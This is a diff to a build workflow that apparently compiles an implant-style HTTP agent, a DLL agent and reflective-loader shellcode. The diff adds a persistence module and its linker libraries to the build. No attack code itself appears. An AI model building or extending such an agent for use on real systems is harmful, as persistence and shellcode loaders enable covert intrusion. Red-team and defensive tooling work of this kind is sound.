@@ -67,7 +67,8 @@ jobs:
                     http_client.cpp \
                     task.cpp \
                     pe-exec.cpp \
-                    -lwininet -lpsapi -lshlwapi -static-libstdc++ -static-libgcc -lws2_32
+                    persistence.cpp \
+                    -lwininet -lpsapi -lshlwapi -lole32 -lshell32 -static-libstdc++ -static-libgcc -lws2_32
 
             - name: Build DLL agent
               working-directory: agent/http
@@ -83,7 +84,8 @@ jobs:
                     http_client.cpp \
                     task.cpp \
                     pe-exec.cpp \
-                    -lwininet -lpsapi -lshlwapi -static-libstdc++ -static-libgcc -lws2_32
+                    persistence.cpp \
+                    -lwininet -lpsapi -lshlwapi -lole32 -lshell32 -static-libstdc++ -static-libgcc -lws2_32
 
             - name: Generate Shellcode
               working-directory: agent/http/ReflectiveLoader
